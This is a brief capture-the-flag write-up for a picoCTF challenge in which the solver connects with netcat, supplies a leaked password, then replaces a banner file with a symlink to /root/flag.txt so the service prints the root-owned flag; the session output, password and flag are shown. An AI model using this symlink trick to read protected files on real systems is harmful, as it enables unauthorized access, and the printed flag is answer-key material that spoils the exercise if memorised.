## Descripción
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 53594`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 50352`. From the above information abuse the machine and find the flag in the /root directory.
## Solución
```
┌──(kali㉿kali)-[~/Documents/parcial_1]
└─$ nc tethys.picoctf.net 50352
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ rm /home/player/banner
rm /home/player/banner
player@challenge:~$ ls -s /root/flag.txt /home/player/banner
ls -s /root/flag.txt /home/player/banner
ls: cannot access '/home/player/banner': No such file or directory
4 /root/flag.txt
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
player@challenge:~$ ^C
                                                                                                                    
┌──(kali㉿kali)-[~/Documents/parcial_1]
└─$ nc tethys.picoctf.net 50352
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_a0e119d4}


```
## Notas
## Referencias